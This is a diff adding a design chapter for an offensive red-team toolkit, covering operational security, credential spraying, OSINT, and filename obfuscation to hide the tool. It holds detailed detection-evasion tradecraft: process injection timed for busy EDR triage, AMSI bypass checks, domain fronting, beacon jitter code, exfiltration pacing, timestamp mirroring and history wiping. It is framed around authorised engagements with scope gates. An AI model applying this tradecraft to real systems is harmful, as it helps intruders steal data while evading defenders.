@@ -1,0 +1,1007 @@
+# FORGE Toolkit v7.2 — Chunk 8: OPSEC, Quick Start & Implementation Timeline
+
+> **Classification:** Internal — Authorised Use Only
+> **Status:** Implementation-Ready (v7.2 — March 2026)
+> **Scope:** This chunk is the primary operator reference during live engagements. It covers operational security (per-phase), filesystem signature obfuscation, the full kill-chain quick-start workflow, the 30–35 week implementation timeline, the effort summary table, the anti-patterns catalogue, and CI pipeline guidance. All other architectural detail is in Chunks 0–7.
+> **v7.2 additions:** Module 2-J (Key Scanner), Modules 4-D–4-G (IDOR Scanner, Firebase Agneyastra, Firebase Extract, Supabase RLS Scanner). See §12.3.9, §12.7, §13.4, §14, §17, §17.1, §18.
+> **v7.4 planning addendum:** Competitive benchmark and parity roadmap against SQLmap, skipfish, and AutoRecon is tracked in `competitive_gap_plan_sqlmap_skipfish_autorecon.md`.
+
+---
+
+## Project Context: FORGE Toolkit v7.2
+
+FORGE v7.2 is a modular, CPU-optimised, full-spectrum offensive security platform for authorised red team operations and penetration testing. All modules are deterministic, rule-based, and offline-first where possible.
+
+| Phase | Name | Modules |
+|-------|------|---------|
+| 0 | Knowledge Base | ETL pipeline — LOLBAS, GTFOBins, LOTS, MalAPI, Exploit-DB, NVD CVE |
+| 1 | Reconnaissance | Engagement wizard, subdomain enum, port scan, email harvest, resume detection |
+| 2 | OSINT & Credential Intelligence | 2-A (Breach DB), 2-B (Validator), 2-C (DeHashed), 2-D (XposedOrNot), 2-E (theHarvester), 2-F (Emailrep.io), 2-G (Epieos), 2-H (Username Enum), **2-I (GitHub OSINT)**, **2-J (Key Scanner)** |
+| 3 | Evasion & Payload Generation | 6-criterion obfuscation matrix, encoding chain, HTML smuggling, LOTS selector |
+| 4 | Exploit Correlation & Vulnerability Discovery | Version parser, searchsploit integration, CVSS enrichment, **4-D (IDOR Scanner)**, **4-E (Firebase Agneyastra)**, **4-F (Firebase Extract)**, **4-G (Supabase RLS Scanner)** |
+| 5 | Post-Exploitation | 5-F (Reverse Shell), 5-G (C2 Beacon), 5-H (Exfiltration), 5-I (Persistence), 5-J (Lateral Movement) |
+| 6 | LLM-Assisted Reporting | Qwen2.5-1.5B report synthesis, Phase 2 + Phase 5 context integration |
+---
+
+## 12. OPERATIONAL SECURITY
+
+OPSEC is a first-class architectural concern in FORGE. Every phase has specific controls. Operators must read and apply this section before any live engagement action.
+
+---
+
+### 12.1 Global OPSEC Baseline (All Phases)
+
+These controls apply universally regardless of which phase is active.
+
+| Control | Implementation |
+|---------|---------------|
+| **Disk encryption** | All engagement databases and credential stores encrypted with `age`. Key material never written to disk unencrypted. |
+| **Secure deletion** | `shred -n 3 -z <file>` before `unlink`. Verify with `lsof` that no process holds the fd open before shredding. |
+| **Command history** | Prepend all sensitive commands with a leading space (requires `HISTCONTROL=ignorespace`). Alternatively, `unset HISTFILE` for the operator shell session. Purge `~/.zsh_history` / `~/.bash_history` post-engagement. |
+| **Memory residency** | Never print plaintext credentials to stdout. Use `getpass` for interactive input. Overwrite sensitive strings with `ctypes.memset` or equivalent after use where Python's GC timing is non-deterministic. |
+| **Network isolation** | The operator machine must use a VPN or out-of-band connection. Never initiate OSINT queries from the target network. |
+| **Audit log** | Every module action is appended to `audit_log` in the engagement SQLite DB. The log is append-only; no delete path exists. |
+| **Scope gate** | `scope_gate.assert_in_scope()` is called at the entry point of every Phase 2 and Phase 5 action. `ScopeViolationError` is fatal and non-suppressible. |
+
+---
+
+### 12.2 Phase 1 — Reconnaissance OPSEC
+
+- **DNS queries:** Use `--resolver 1.1.1.1` or an operator-controlled resolver. Never use the target organisation's DNS servers for subdomain enumeration; resolver logs are trivially captured.
+- **Port scan timing:** Default scan rate is capped at 100 packets/s. For stealth engagements, use `--rate 10` and `--scan-delay 500ms`.
+- **theHarvester output:** Written to `tempfile.NamedTemporaryFile(delete=False)`; the path is registered with `cleanup.py`. The file is removed via `path.unlink(missing_ok=True)` immediately after JSON parsing. Never write to a predictable path like `/tmp/harvest_output.json`.
+- **User-agent strings:** All HTTP-based recon uses a configurable UA string defaulting to a current Chrome version. Do not expose tool-specific UAs (`python-requests/2.x`, `Go-http-client/1.1`).
+- **Certificate transparency:** `crt.sh` queries are logged by the service; consider whether CT exposure is acceptable for the target prior to querying.
+
+---
+
+### 12.3 Phase 2 — OSINT & Credential Intelligence OPSEC
+
+This section covers all ten Phase 2 modules. Operators must review each subsection relevant to their planned actions.
+
+#### 12.3.1 Module 2-A: Local Breach Database (Offline)
+
+- **Query logging:** `breach_query_log` records only `email` and a `matched` boolean. Passwords are **never** written to any log table.
+- **DB location:** The breach DB path is passed at invocation (`--db`). Never store it inside the engagement directory. Recommended location: a separately encrypted volume (`/mnt/breach/`).
+- **Data retention:** Breach DB files must be securely deleted after engagement conclusion per the engagement cleanup plan. Register the path with `cleanup.py` at the start of the session.
+- **Format flag:** Use `--format email:pass` only on authorised datasets. Malformed lines are silently skipped; validate with `forge osint breach --dry-run` before live query.
+
+#### 12.3.2 Module 2-B: Credential Validation / Spray
+
+- **Dry-run enforcement:** `--dry-run` is the default. The `--execute` flag requires explicit operator confirmation via an interactive `questionary.confirm()` prompt. This cannot be bypassed programmatically.
+- **Plaintext exposure:** Passwords are decrypted (`age decrypt`) immediately before the auth adapter call. The plaintext string is explicitly `del`-ed after use. Python's GC provides no timing guarantees; use `ctypes.memset` on the buffer if CPython internals allow.
+- **Lockout risk:** The concurrent spray semaphore is capped at 3 by default (`--concurrency 3`). Operators must verify the target account lockout policy before increasing. Document lockout threshold in the engagement brief.
+- **Delay:** Minimum inter-request delay is 5 seconds on SSH/RDP adapters. HTTP form adapters default to 2 seconds. Gaussian jitter (`σ = 30%`) is applied to all delays automatically.
+- **Audit:** Every auth attempt (success or failure) is written to `audit_log` with timestamp, target, protocol, and outcome. Passwords are logged as `***REDACTED***`.
+
+#### 12.3.3 Module 2-C: DeHashed API
+
+- **API key storage:** Store in `config/secrets.age` (age-encrypted). The key is never written to environment variables or command-line arguments.
+- **ETag caching:** Module uses HTTP `ETag` / `If-None-Match` incremental sync. Do not re-query the same search term within a session without cache invalidation; DeHashed logs all queries associated with a key.
+- **Rate limiting:** Free tier is 1 req/s; paid tiers vary. The module enforces `asyncio.sleep(1.0)` between requests. Do not override with `--delay 0`.
+- **Attribution risk:** DeHashed retains query logs indefinitely. Use only from the operator machine, not from infrastructure shared with the target.
+
+#### 12.3.4 Module 2-D: XposedOrNot API
+
+- **Rate limiting:** Free tier: 1 req/s. The module enforces this with a token bucket. Do not modify `RATE_LIMIT_RPS` in `config.py` below this threshold.
+- **Response logging:** XposedOrNot returns breach metadata only (no plaintext passwords). The full response JSON is stored in the engagement DB under `xposed_results`. No PII beyond email domain is retained in logs.
+- **Connectivity:** This module requires outbound HTTPS to `api.xposedornot.com`. If the operator network blocks this, pre-cache results with `forge osint xposed --cache-only` during the pre-engagement window.
+
+#### 12.3.5 Module 2-E: theHarvester Wrapper
+
+- **Subprocess isolation:** theHarvester is invoked as a subprocess with a 120-second timeout. If the process hangs, it is `SIGKILL`-ed and the temp file is cleaned up.
+- **Source selection:** LinkedIn (`--sources linkedin`) requires a valid session cookie or will be blocked after a small number of requests. Use `--sources google,bing` for lower-attribution options.
+- **Output path:** See §12.2 guidance on temp file management. theHarvester's `--json` flag is always set; XML output is not used.
+
+#### 12.3.6 Module 2-F: Emailrep.io *(New — v7.0)*
+
+- **Rate limiting:** The free tier enforces **1 req/s** with a daily cap of 1,000 requests. The module wraps all calls in a `TokenBucketRateLimiter` with `rate=1.0`. Exceeding the daily cap results in a `429`; the module backs off for 60 seconds and retries once before failing gracefully.
+- **API key storage:** Store in `config/secrets.age`. Never pass via `--api-key` CLI argument (visible in `ps aux` output and shell history). The module reads the key exclusively from the decrypted secrets store at runtime.
+- **Query logging:** Emailrep.io **logs every query** server-side, including the queried email address. Assume full query attribution. Do not query high-value or sensitive targets (e.g., executive email addresses) unless the engagement brief explicitly permits it.
+- **Response caching:** Responses are cached in the engagement DB under `emailrep_cache` with a 24-hour TTL. Repeated queries within a session use the cache and do not generate additional API traffic.
+- **Recommended usage:** Limit Emailrep.io queries to email addresses already confirmed in scope. Use `forge osint emailrep --dry-run` to preview the query list before execution.
+
+```python
+# Correct pattern: rate-limited, key from secrets store
+async def query_emailrep(email: str, secrets: SecretsStore) -> dict:
+    api_key = secrets.get("emailrep_api_key")          # decrypted at call time
+    async with rate_limiter:                            # TokenBucketRateLimiter(rate=1.0)
+        resp = await client.get(
+            f"https://emailrep.io/{email}",
+            headers={"Key": api_key, "User-Agent": UA_STRING},
+        )
+    resp.raise_for_status()
+    return resp.json()
+
+# Anti-pattern: never do this
+# subprocess.run(["curl", f"https://emailrep.io/{email}?key={api_key}"])
+# Reason: key visible in process list, no rate limiting, no error handling
+```
+
+#### 12.3.7 Module 2-G: Epieos *(New — v7.0)*
+
+- **No target notification:** Epieos does not notify the queried email owner. However, **all queries are logged by Epieos** on their infrastructure. Treat every Epieos query as attributed and auditable by Epieos.
+- **Operational caution:** Epieos correlates an email address against social accounts (Google, Apple, Gravatar, etc.). This is highly effective but carries third-party logging risk. Use only for email addresses within confirmed engagement scope.
+- **Proxy / Tor usage:** For sensitive investigations where third-party logging is unacceptable, route Epieos queries through Tor (`--proxy socks5://127.0.0.1:9050`) or a VPN egress IP unassociated with the operator organisation. The module supports the `HTTP_PROXY` / `HTTPS_PROXY` environment variables and the `--proxy` CLI flag.
+- **Session isolation:** Each Epieos query session should use a fresh HTTP session object (`httpx.AsyncClient()`). Do not reuse sessions across different email targets; session correlation is a de-anonymisation vector.
+- **Output retention:** Epieos results (social account linkages) are written to `epieos_results` in the engagement DB. Results are AES-256-GCM encrypted at rest using the engagement key.
+
+```python
+# Correct: proxy-isolated, session-per-target
+async def query_epieos(email: str, proxy: str | None = None) -> dict:
+    transport = httpx.AsyncHTTPTransport(proxy=proxy) if proxy else None
+    async with httpx.AsyncClient(transport=transport, timeout=30) as client:
+        resp = await client.get(
+            "https://epieos.com/api/",
+            params={"q": email, "type": "email"},
+            headers={"User-Agent": UA_STRING},
+        )
+    resp.raise_for_status()
+    return resp.json()
+```
+
+#### 12.3.8 Module 2-H: Username Enumeration *(New — v7.0)*
+
+- **Site logging risk:** Many sites (Twitter/X, GitHub, LinkedIn, Reddit) log enumeration requests, even when unauthenticated. Some trigger account-level flags or IP-level rate limiting after repeated 404/200 pattern probing. **Assume all queries are potentially logged.**
+- **Proxy / Tor recommendation:** For any username enumeration against sites that perform session tracking or IP logging, use `--proxy socks5://127.0.0.1:9050` or a rotating residential proxy pool. The `--rotate-proxy` flag accepts a newline-delimited proxy list file.
+- **Rate limiting:** Default: 1 req/2s per target site, with ±50% Gaussian jitter. Do not lower the inter-request delay below 500ms. Some sites enforce hard rate limits at the CDN layer (Cloudflare, Akamai); repeated fast requests will trigger IP blocks that may expose the operator's infrastructure.
+- **404 vs. redirect disambiguation:** Username existence detection is based on HTTP status code and/or response body signature (configurable per site in `username_enum_sites.json`). Ensure the site signature file is current; stale signatures produce false positives.
+- **Scope alignment:** All queried usernames must be derived from email addresses or names that appear in the engagement scope. Cross-check against `scope_gate` before building the target username list.
+- **False positive handling:** Mark uncertain results as `UNCONFIRMED` in the engagement DB. Only `CONFIRMED` results are included in the Phase 6 report.
+
+```python
+# sites.json structure (per-site signature config)
+{
+  "github": {
+    "url": "https://github.com/{username}",
+    "found_status": 200,
+    "not_found_status": 404,
+    "found_body_contains": null,
+    "not_found_body_contains": "Not Found",
+    "rate_limit_rps": 0.5
+  },
+  "twitter": {
+    "url": "https://twitter.com/{username}",
+    "found_status": 200,
+    "not_found_status": 404,
+    "found_body_contains": "twitter:site",
+    "not_found_body_contains": null,
+    "rate_limit_rps": 0.2
+  }
+}
+```
+
+#### 12.3.9 Module 2-J: Key Scanner *(New — v7.2)*
+
+- **Throwaway burn account:** Never use a personal or primary operator GitHub account for GitHub Code Search API calls. All 2-J searches must be performed via a purpose-created, non-attributable GitHub account. The account must not be linked to any real identity, infrastructure, or previous engagements.
+- **Validation proxy enforcement:** API key validation calls (AWS STS `GetCallerIdentity`, Stripe `GET /v1/account`, etc.) must be routed through `--validation-proxy`. The CLI exits with code 1 if `--validation-proxy` is not set and `--no-validate` is not explicitly passed. There is no silent fallback to direct validation.
+- **Search query attribution:** GitHub Code Search logs all queries against the authenticated token. Queries containing target domain names or company-specific strings are directly attributable. Prefer generic pattern-based searches and filter client-side.
+- **Rate limit compliance:** GitHub Code Search is capped at 10 requests/minute (authenticated). The module enforces this via `asyncio.sleep(6.0)` between requests. Do not modify the rate limit constant; GitHub will temporarily ban the token on sustained abuse.
+- **Key storage:** All discovered API keys are age-encrypted before insertion into `key_scanner_findings`. Raw key values must never appear in `audit_log`, stdout, or any unencrypted output file.
+- **Validation blast radius:** AWS `GetCallerIdentity` is a non-destructive read operation. However, Stripe validation (`GET /v1/account`) does generate a server-side API log entry. Only validate keys where the engagement brief explicitly covers the corresponding service.
+- **Revocation reporting:** Any ACTIVE key discovered is a High or Critical finding. The engagement brief must include a timeline for disclosure to the target's security team. Do not retain active third-party keys beyond the engagement window.
+
+```bash
+# Correct workflow: burn account + proxy enforced
+GITHUB_TOKEN=ghp_burnaccount forge osint keyscan \
+  --engagement acme-001 \
+  --validation-proxy http://127.0.0.1:8080 \
+  --dry-run        # always preview patterns before live search
+
+# Anti-pattern: never do this
+# forge osint keyscan --engagement acme-001
+# Reason: no proxy → validator calls trace directly to operator IP
+#         no --dry-run → live GitHub searches before pattern review
+```
+
+---
+
+### 12.4 Phase 3 — Evasion & Payload Delivery OPSEC
+
+- **HTTPS only:** All payload delivery URLs must use HTTPS with a valid TLS certificate. HTTP delivery is blocked at the CLI level.
+- **LOTS hosting:** Use Living-Off-Trusted-Sites (LOTS) for payload staging. Do not host payloads on attacker-controlled infrastructure during delivery.
+- **URL shortener:** Shortener links are one-time-use by default (`--one-time`). After first retrieval, the link returns a `410 Gone`. This prevents blue team analysis by replaying the delivery URL.
+- **Exponential backoff:** All delivery retries use exponential backoff with jitter. Never retry more than 5 times; persistent failures indicate detection.
+- **Payload metadata:** Strip all metadata from generated payloads (compilation timestamps, operator username in PE headers, Python `__file__` paths). The `forge build --strip-metadata` flag is enabled by default.
+
+---
+
+### 12.5 Phase 5 — Post-Exploitation OPSEC
+
+#### 12.5.1 Reverse Shell (Module 5-F)
+
+- **TLS enforcement:** All reverse shells use TLS. Plaintext shells are disabled. The self-signed certificate used for the TLS shell must be generated fresh per engagement (`forge payload reverse-shell --gen-cert`).
+- **Port selection:** Use ports 443, 80, or 8443. Avoid non-standard ports; egress filtering typically allows 443/80.
+- **Process injection:** Process injection (e.g., `--inject-pid`) may still trigger **behavioural EDR** even when the shell itself is obfuscated. Mitigations:
+  - Combine `--inject-pid` with `--obfuscate` and `--sleep-mask`.
+  - Target a PID dynamically at runtime (see anti-pattern §15.5); never hardcode a PID.
+  - Prefer injecting into long-lived, low-suspicion processes: `explorer.exe`, `svchost.exe` (with valid service tag), `RuntimeBroker.exe`.
+  - Execute injection during business hours when EDR alert triage load is highest (see `--window` flag).
+  - Do not inject into security product processes (AV/EDR executables); this is a near-universal EDR detection heuristic.
+- **AMSI bypass:** The generated bypass must be validated against the target OS patch level. Use `forge payload reverse-shell --check-amsi` to test bypass efficacy against a known AMSI signature set before deployment.
+
+#### 12.5.2 C2 Beacon (Module 5-G)
+
+- **Beacon interval:** Minimum 60 seconds in any monitored environment. For high-security targets, use 300–900 seconds.
+- **Jitter:** Use Gaussian jitter exclusively. Uniform jitter produces a detectable bimodal timing signature. The Gaussian `σ` should be 20–35% of the base interval.
+
+```python
+import random, time
+
+def beacon_sleep(interval_s: float, sigma_pct: float = 0.25) -> None:
+    """Gaussian-jittered sleep. sigma_pct = stddev as fraction of interval."""
+    sigma = interval_s * sigma_pct
+    actual = max(10.0, random.gauss(interval_s, sigma))   # floor at 10s
+    time.sleep(actual)
+
+# Anti-pattern: uniform jitter — detectable by timing analysis
+# time.sleep(interval + random.uniform(-30, 30))
+```
+
+- **Domain fronting:** The TLS SNI must match a legitimate CDN domain (`cdn.legitimate-cloud.com`). The HTTP `Host` header routes to the actual C2. Validate that the CDN does not perform SNI/Host consistency checks (many do post-2023; test pre-engagement).
+- **Sleep masking:** Enabled by default on all C agents and PowerShell agents in monitored environments. Disabling via `--no-sleep-mask` requires explicit confirmation.
+- **AES keys:** Keys in generated agent templates are random placeholders (`REPLACE_BEFORE_DEPLOY`). Operators **must** replace before deployment. CI tests will fail if placeholder strings are detected in output agents.
+- **Realistic HTTP headers:** Beacon HTTP requests must include realistic `Accept`, `Accept-Encoding`, `Accept-Language`, and `Cache-Control` headers. The default header set mimics Chrome 122 on Windows 11.
+
+#### 12.5.3 Exfiltration (Module 5-H)
+
+- **Staging path:** Collectors write to existing writable subdirectories (`%APPDATA%\Microsoft\`, `C:\Windows\Temp\`). Never create new top-level directories. All staging paths are registered with `cleanup.py` at the time of collection.
+- **Rate limit:** Default 50 KB/s. For high-sensitivity environments, use `--rate 10k`. Volume-based EDR rules typically trigger at sustained multi-MB/s egress.
+- **Time window:** Always use `--window 09:00-17:00` unless the engagement brief explicitly authorises off-hours exfiltration. Off-hours data movement is a high-fidelity EDR/SIEM alert.
+- **Channel reuse:** Reuse the active C2 channel for exfiltration where possible (`--channel c2-reuse`). Establishing a secondary exfil channel creates an additional network signature.
+- **Collector stagger:** The default 500ms inter-file stagger is mandatory. Bulk-read patterns (reading 100 files in under 1 second) are flagged by most modern EDR solutions.
+
+#### 12.5.4 Persistence (Module 5-I)
+
+- **LOLBin naming:** All scheduled task and service names are drawn from the `schtasks_legit_names` table in `lolbas.db`. Never use operator-created names (`forge_agent`, `backdoor_svc`).
+- **Timestamp mirroring:** Always mirror timestamps from an adjacent legitimate file using `--mirror-timestamp-from`. FIM (File Integrity Monitoring) solutions alert on files with creation timestamps out of band with their modification timestamps.
+- **COM hijack:** Does not require `Run` key modification. The `HKCU` registry write is less monitored than `HKLM`. Validate the target CLSID is actually queried by the target application before deploying.
+- **Cleanup generation:** Every persistence template generates a paired cleanup command at creation time. The cleanup command is stored in `persistence.cleanup_cmd` in the engagement DB. Operators **must not** skip cleanup on `forge clean`.
+- **Process injection persistence:** If using a process-injection-based persistence method, regenerate the injection target PID at every execution. A hardcoded PID that no longer exists causes a noisy failure that may alert defenders.
+
+#### 12.5.5 Lateral Movement (Module 5-J)
+
+- **Timing:** All lateral movement must be gated via `--window 09:00-17:00`. Network authentication events outside business hours are a high-priority SIEM alert in most enterprise environments.
+- **Kerberos vs. NTLM:** Prefer Kerberos PTT over NTLM wherever possible. NTLM relay and hash-passing generate well-understood Sigma rules. Kerberos PTT (`--ticket`) leaves a lower-fidelity event trail.
+- **Named pipes:** Prefer `atsvc` or `winreg` named pipes over `svcctl`. `svcctl`-based lateral movement (classic `sc.exe` remote service creation) is heavily signatured.
+- **Cleanup:** SMB execution generates remote service or task artefacts. Generate and store the cleanup command immediately after execution. `forge move lateral --cleanup-on-exit` automates this.
+- **DCOM:** DCOM-based execution (`--technique dcom`) is lower-detection than SMBExec but may generate DCOM activation events. Validate EDR coverage against DCOM telemetry in the target environment assessment.
+- **Behavioural EDR note:** Process injection used during lateral movement still triggers behavioural detectors in CrowdStrike Falcon, SentinelOne, and Microsoft Defender for Endpoint. The recommended mitigation stack is: `--obfuscate` + `--sleep-mask` + `--window` + dynamic PID selection. There is no guarantee of evasion in hardened environments; document the detection risk in the engagement brief.
+
+---
+
+### 12.6 Filesystem Signatures (v7.0 — Complete)
+
+All module filenames must use the obfuscated form on operator disk. The canonical → obfuscated mapping is enforced by the project scaffold generator (`forge scaffold`).
+
+| Canonical (Avoid) | Obfuscated (Use) | Phase |
+|-------------------|-----------------|-------|
+| `forge/phase2/` | `forge/utils/intel/` | 2 |
+| `forge/phase5/` | `forge/utils/post/` | 5 |
+| `breach_db.py` | `data_connector.py` | 2-A |
+| `credential_validator.py` | `auth_check.py` | 2-B |
+| `dehashed.py` | `index_query.py` | 2-C |
+| `xposedornot.py` | `exposure_check.py` | 2-D |
+| `theharvester.py` | `contact_enum.py` | 2-E |
+| `emailrep.py` | `reputation_lookup.py` | 2-F |
+| `epieos.py` | `social_scraper.py` | 2-G |
+| `username_enum.py` | `handle_finder.py` | 2-H |
+| `reverse_shell.py` | `template_engine.py` | 5-F |
+| `c2_generator.py` | `session_manager.py` | 5-G |
+| `exfiltration.py` | `transfer_util.py` | 5-H |
+| `persistence.py` | `schedule_builder.py` | 5-I |
+| `lateral_movement.py` | `remote_exec.py` | 5-J |
+| `scope_gate.py` | `boundary_check.py` | Shared |
+| `exfiltrated_data/` | `staging/` | 5-H |
+| `agents/` | `sessions/` | 5-G |
+| `payloads/` | `templates/` | 3, 5-F |
+| `key_scanner.py` | `secret_finder.py` | 2-J |
+| `idor_scanner.py` | `param_probe.py` | 4-D |
+| `firebase_agneyastra.py` | `cloud_audit.py` | 4-E |
+| `firebase_extract.py` | `mobile_config_parse.py` | 4-F |
+| `supabase_scanner.py` | `api_policy_check.py` | 4-G |
+| `exploit_cache.db` | `ref_cache.db` | 4 |
+| `breach_query_log` | `query_audit` (table) | 2-A |
+
+> **Implementation note:** The `forge scaffold` command regenerates the full directory tree using obfuscated names. Any developer adding a new module must submit the canonical → obfuscated name pair in the module's PR. The CI lint step (`test-filename-opsec`) rejects any file in `forge/utils/intel/` or `forge/utils/post/` whose name matches the canonical blocklist.
+
+---
+
+## 12.7 Phase 4 — Vulnerability Discovery OPSEC *(New — v7.2)*
+
+This section covers Modules 4-D through 4-G. The existing Phase 4 exploit correlation modules (4-A, 4-B, 4-C) are read-only against local DBs and generate no network traffic; they require no additional OPSEC controls beyond §12.1.
+
+#### 12.7.1 Module 4-D: IDOR Scanner
+
+- **Scope gate per fetch:** The scope gate is enforced at every URL resolved during BFS, not only on the seed URL. Do not attempt to modify or suppress the per-fetch scope check; `ScopeViolationError` is fatal and non-suppressible.
+- **Dry-run first:** Always run `--dry-run` before a live crawl. Review the discovered ID parameters and estimated probe count before committing to live probes.
+- **Server-side logging:** Every probe generates a server-side log entry on the target. The target web application and its WAF/SIEM will see the probe traffic. Ensure the engagement brief explicitly authorises active web scanning before running Module 4-D.
+- **Delay floor:** The `--delay` minimum is 1.0 s with ±20% jitter. Do not set `--delay` below 1.0; CDN-layer WAFs (Cloudflare, Akamai) trigger temporary IP blocks on sub-second probe patterns.
+- **Evidence truncation:** Module 4-D stores only the first 512 characters of a divergent response body. It does not store full responses. Do not modify `evidence = probe_resp.text[:512]`; full response storage creates an oversized engagement DB and potential PII retention liability.
+- **Cookie file handling:** Cookie files passed via `--cookie` may contain session tokens. Ensure the file is stored on an encrypted volume and is registered with `cleanup.py`. Delete after the scan completes.
+
+#### 12.7.2 Module 4-E: Firebase Agneyastra
+
+- **Agneyastra output file cleanup:** The JSON output file produced by Agneyastra is registered with `cleanup.py` before subprocess invocation and deleted immediately after parsing. If the process is interrupted (`SIGKILL`, operator `Ctrl+C`), `forge clean` will remove the file via the registered cleanup path. Do not disable or defer the cleanup registration.
+- **API key in subprocess args:** The Firebase API key sourced from `key_scanner_findings` is passed to Agneyastra as `--api-key`. This value is redacted in the `audit_log` but is visible in `/proc/$PID/cmdline` during the subprocess lifetime. On Linux, the exposure window is limited to the Agneyastra execution time. Do not run Module 4-E on a shared operator machine.
+- **Test scope:** Only run the tests listed in `--tests`. Do not run `auth` or `database` tests unless the engagement brief explicitly authorises Firebase authentication testing against the target project. Some tests (Realtime DB write probes) are destructive.
+- **Agneyastra version pinning:** Pin `agneyastra >= 1.0.0` in CI. The Docker image `ghcr.io/redhuntlabs/agneyastra:1.0.0` is used in CI; operators must verify their local binary matches this version with `agneyastra --version`.
+
+#### 12.7.3 Module 4-F: Firebase Extract
+
+- **No network activity:** Module 4-F is entirely offline. No scope gate or proxy configuration is required. It may be run in a pre-engagement window without live target contact.
+- **APK/IPA file provenance:** Only analyse APK/IPA files that were obtained through authorised means (official app store downloads, files provided by the client). Do not analyse files from third-party APK mirror sites.
+- **API key encryption:** Extracted Firebase API keys are age-encrypted at extraction time before storage in `cloud_assets`. The raw key value is never written to disk, `audit_log`, or `--output-json` in plaintext. Verify this with `forge cloud firebase-extract --dry-run` before a live extraction.
+- **`--output-json` handling:** JSON output files are written to the path specified by `--output-json`. Register this path with `cleanup.py` immediately after creation. Delete after Module 4-E has consumed the file.
+
+#### 12.7.4 Module 4-G: Supabase RLS Scanner
+
+- **Write probe consent:** The anonymous write probe (`POST /rest/v1/<table>`) creates a record in the target's live database with the payload `{"__forge_probe__": true}`. This is a traceable artefact. `questionary.confirm()` is required before each write probe. Use `--dry-run` to suppress all write probes entirely.
+- **Anon key in CLI args:** The `--anon-key` value is the Supabase project's public anonymous JWT, which is typically embedded in the target's frontend JavaScript. Passing it via CLI argument exposes it in process list and shell history. Prefer `--anon-key-file <path>` or set `SUPABASE_ANON_KEY` in the environment.
+- **Scope gate:** The Supabase project hostname `<project-ref>.supabase.co` must be in engagement scope before Module 4-G is invoked. The scope gate check is enforced at module entry; do not attempt to bypass via direct instantiation.
+- **Auth token handling:** The `--auth-token` JWT passed for authenticated differential testing is a high-value credential. It must be stored in `config/secrets.age` and decrypted at invocation time only. Never pass a production user JWT; use a purpose-created test account provisioned by the client for the engagement.
+- **Evidence truncation:** Response body evidence is capped at 512 characters. Do not modify this limit; Supabase tables may contain PII rows, and full response storage creates unacceptable data retention risk.
+
+---
+
+## 13. ANTI-PATTERNS CATALOGUE
+
+A curated list of implementation mistakes with demonstrated operational or security impact. All FORGE contributors must review this section before submitting a PR.
+
+### 13.1 Phase 2 Anti-Patterns
+
+| Anti-Pattern | Risk | Correct Approach |
+|---|---|---|
+| Logging matched passwords to `audit_log` | Plaintext credential exfiltration if DB is captured | Log only email + `matched: bool`. Passwords stay in encrypted `password_plaintext_enc` column only. |
+| Passing API keys via CLI `--api-key` flag | Key visible in `ps aux`, shell history, `/proc/$PID/cmdline` | Read keys exclusively from age-encrypted secrets store at runtime. |
+| Hardcoding rate limits as `0` or `None` | Causes API ban, 429 storms, attribution risk | Always enforce minimum delays. Use `TokenBucketRateLimiter`. |
+| Using a shared `httpx.AsyncClient` across Epieos targets | Session correlation de-anonymises multi-target queries | Instantiate a new `AsyncClient` per target when anonymity is required. |
+| Writing theHarvester output to a predictable path | Path scraping by EDR; reveals tool identity | Always use `tempfile.NamedTemporaryFile()`. Register path with `cleanup.py`. |
+| Querying all OSINT APIs in parallel without proxy | Correlated queries from a single IP reveal operator infrastructure | Serialise sensitive queries or route through rotating proxies / Tor. |
+
+### 13.2 Phase 3 Anti-Patterns
+
+| Anti-Pattern | Risk | Correct Approach |
+|---|---|---|
+| HTTP payload delivery URLs | TLS stripping, blue team interception, proxy logging | HTTPS only. Enforce at CLI level. |
+| Reusing URL shortener links | Blue team replay of delivery URL reveals payload | Enable `--one-time` shortener links by default. |
+| Identifiable User-Agent strings | Tool fingerprinting (`python-requests/2.x`) | Maintain a rotating list of current browser UA strings. Default to Chrome on Windows. |
+
+### 13.3 Phase 5 Anti-Patterns
+
+| Anti-Pattern | Risk | Correct Approach |
+|---|---|---|
+| **Fixed beacon intervals** | Timing-based detection; EDR ML models flag periodic beacons | Use Gaussian jitter (`random.gauss(interval, σ)`). Never use uniform jitter or fixed sleep. |
+| **Hardcoded injection PID** | Target process may not exist; noisy crash on failure triggers EDR alert | Select PID dynamically at agent runtime from a prioritised list (`explorer.exe` → `svchost.exe` → fallback). |
+| **No cleanup after persistence** | Artefacts left on target; discovery during forensic review | Every persistence template generates a cleanup command at creation. Store in `persistence.cleanup_cmd`. Executed automatically by `forge clean`. |
+| **Leaving agent processes running post-engagement** | Active C2 channel creates ongoing unauthorised access; legal and ethical violation | Every generated agent includes a `--self-destruct` or `--uninstall` path. The engagement cleanup checklist requires confirmation of agent termination. |
+| **Bulk file reads during exfil** | High-volume file I/O in short time window is a universally signatured EDR pattern | Enforce per-file stagger (`--stagger 500ms`). Default collector stagger is non-negotiable. |
+| **Off-hours lateral movement** | Authentication events at 03:00 are high-priority SIEM alerts | Gate all remote execution via `--window`. Default: `09:00-17:00`. |
+| **NTLM hash reuse without PTT** | NTLM relay/pass-the-hash has well-established Sigma rule coverage | Prefer Kerberos PTT. Use NTLM only when Kerberos is unavailable; document the decision. |
+| **Sleeping with plaintext heap** | Memory forensics (LSASS dump, Volatility) recovers agent config and keys | Enable `--sleep-mask` on all agents. C agents must XOR-encrypt heap during sleep. |
+| **Skipping `--obfuscate` on reverse shells** | Static signature detection trivially catches unobfuscated templates | `--obfuscate` is the enforced default. Unobfuscated output requires `--no-obfuscate` + explicit confirmation. |
+| **Creating new exfil directories** | Novel directory creation at `C:\` level is a high-fidelity FIM alert | Write only to pre-existing writable paths. Enumerate with `forge exfil --list-writable` pre-staging. |
+
+---
+
+### 13.4 Phase 4 Cloud & Web Anti-Patterns *(New — v7.2)*
+
+| Anti-Pattern | Risk | Correct Approach |
+|---|---|---|
+| Crawling beyond `--depth` or following off-domain redirects in Module 4-D | Scope creep; probes reach out-of-scope assets; creates legal exposure | Scope gate enforced at every URL fetch. Never suppress `ScopeViolationError`. Use `--depth 3` default unless engagement brief explicitly permits deeper crawls. |
+| Running Module 4-D without `--dry-run` first | Unexpected probe volume; may trigger WAF IP block before operator reviews target surface | Always run `--dry-run` first. Review ID parameter list and estimated probe count. |
+| Not registering Agneyastra JSON output with `cleanup.py` before invocation | Sensitive Firebase misconfiguration data persists on operator disk if process is interrupted | `register_cleanup_file(output_path)` is called before subprocess. `forge clean` is the fallback. |
